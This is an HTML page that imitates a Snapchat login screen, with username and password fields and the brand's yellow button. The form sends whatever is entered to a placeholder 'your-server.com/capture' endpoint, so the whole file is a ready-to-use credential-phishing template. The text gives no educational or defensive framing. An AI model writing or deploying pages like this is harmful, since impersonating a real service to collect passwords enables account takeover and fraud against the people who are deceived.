<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        .input { width: 100%; padding: 10px; margin: 10px 0; }
        .button { width: 100%; padding: 10px; background-color: #fffc00; border: none; color: black; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Snapchat Login</h2>
        <form action="https://your-server.com/capture" method="post">
            <input type="text" name="username" class="input" placeholder="Username" required>
            <input type="password" name="password" class="input" placeholder="Password" required>
            <button type="submit" class="button">Login</button>
        </form>
    </div>
</body>
</html>
